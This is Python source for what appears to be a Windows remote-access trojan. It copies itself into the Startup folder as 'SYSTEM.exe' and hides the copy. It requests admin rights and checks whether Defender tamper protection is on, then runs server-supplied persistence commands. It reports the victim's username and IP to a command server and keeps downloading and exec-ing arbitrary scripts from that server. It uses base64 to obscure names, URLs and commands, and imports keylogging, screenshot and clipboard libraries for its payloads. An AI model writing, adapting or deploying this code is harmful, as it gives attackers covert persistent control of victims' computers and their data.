import urllib.request
import subprocess
import shutil
import threading
import time
import os
import requests
import sys
import ctypes
from fernet import Fernet
import socket
import base64
import random

# Packages for custom scripts
# Built-In Python Packages can be skipped and directly imported in scripts. 
# However third party packets first have to be loaded here otherwise they will not be available in the scripts.

import pyautogui
import webbrowser
import keyboard
import cv2
import numpy as np
import pyperclip
from PIL import Image
import io
import pynput
import psutil

try:
    server_url = base64.b64decode(requests.get("DO_NOT_CHANGE_ME", headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"}).text).decode()
except:
    server_url = "http://example.com" # Will update after one try. (To combat WiFi outage)

scripts_url = f"{server_url}/scripts.txt"
check_interval = random.randint(1, 15)
APPDATA = os.getenv("APPDATA")
TEMP = os.getenv("TEMP")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
SCRIPT_NAME = base64.b64decode("U1lTVEVNLmV4ZQ==").decode()
SCRIPT_PATH = os.path.join(STARTUP_PATH, SCRIPT_NAME)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
upon_start = False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def request_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
            sys.exit()
        except:
            pass
def get_target_url():
    global server_url
    global scripts_url   
    try:
        return requests.get(scripts_url).text.strip().splitlines()
    finally:
        try:
            server_url = base64.b64decode(requests.get("DO_NOT_CHANGE_ME", headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"}).text).decode()
            scripts_url = f"{server_url}/scripts.txt"
        except:
            pass
def dload_run(script_name):
    if not script_name == "OK":
        script_url = f"{server_url}/scripts/{script_name}"
        try:
            urllib.request.urlretrieve(script_url, os.path.join(TEMP, script_name))
            run(os.path.join(TEMP, script_name))
        except:
            var = None
def run(script_name):
    def run_script():
        try:
            exec(open(script_name).read())
        except:
            var = None
    thread = threading.Thread(target=run_script)
    thread.start()
def send_completion_request():
    try:
        response = requests.post(f"{server_url}/update", data="OK")
    except:
        var = None
def save_copy():
    time.sleep(30)
    try:
        if sys.argv[0] != SCRIPT_PATH:
            shutil.copy(sys.argv[0], SCRIPT_PATH)
            hider = requests.get(f"{server_url}/hide.txt").text
            time.sleep(15)
            subprocess.run(f'{hider} "{SCRIPT_PATH}"')
    except:
        pass
def alert():
    global server_url
    headers = {'Content-Type': 'application/json'}
    def load_ip():
        try:
            return requests.get(base64.b64decode('aHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc=').decode()).text
        except:
            return socket.gethostname()
    def get_user():
        try:
            return os.getlogin()
        except:
            return "Unknown"
    data = {
        "INFO": f"{get_user()} with IP: {load_ip()} has run the executable!"
    }   
    time.sleep(5)
    response = requests.post(f"{server_url}/reply", json=data, headers=headers)
    if int(response.status_code) == 200:
        return True
    else:
        return False
def cryptoz():
    if upon_start:
        cipher_suite = Fernet('ENCRYPT_KEY')
        threading.Thread(target=subprocess.run, args=(cipher_suite.decrypt('COMMAND_UPON_START').decode(),)).start()


save = threading.Thread(target=save_copy)
save.start()
cryptoz()
while True:
    try:
        alert_reply = bool(alert())
        if alert_reply == True:
            requests.post(f"{server_url}/modify", data=server_url)
            break
    finally:
        try:
            server_url = base64.b64decode(requests.get("DO_NOT_CHANGE_ME", headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"}).text).decode()
            scripts_url = f"{server_url}/scripts.txt"
        except:
            pass
request_admin()
if is_admin():
    schedule = requests.get(f"{server_url}/sch.txt").text
    try:
        result = subprocess.run(
            base64.b64decode("cG93ZXJzaGVsbCAtQ29tbWFuZCBHZXQtTXBDb21wdXRlclN0YXR1cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElzVGFtcGVyUHJvdGVjdGVk").decode(),
            capture_output=True, text=True, check=True
        )
        if not "true" in result.stdout.strip().lower():
            subprocess.Popen(requests.get(f"{server_url}/pw.txt").text)
            time.sleep(15)
            subprocess.run(f'{schedule} "{SCRIPT_PATH}"')
    except:
            pass
time.sleep(check_interval)
while True:
    try:
        script_names = get_target_url()
        if script_names:
            for script_name in script_names:
                dload_run(script_name)
                send_completion_request()
        time.sleep(check_interval)
    except:
        pass
    finally:
        check_interval = random.randint(1, 15)